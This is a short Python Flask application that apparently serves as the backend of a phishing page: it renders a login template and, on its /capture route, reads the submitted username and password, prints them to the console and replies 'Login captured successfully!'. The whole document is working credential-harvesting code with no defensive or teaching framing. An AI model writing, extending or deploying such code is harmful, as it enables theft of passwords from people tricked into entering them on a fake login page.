from flask import Flask, request, render_template

app = Flask(__name__)

@app.route("/")
def home():
    return render_template("login.html")

@app.route("/capture", methods=["POST"])
def capture():
    username = request.form.get("username")
    password = request.form.get("password")
    print(f"🔥 Username: {username}")
    print(f"🔥 Password: {password}")
    return "✅ Login captured successfully!"

if __name__ == "__main__":
    app.run(debug=True)
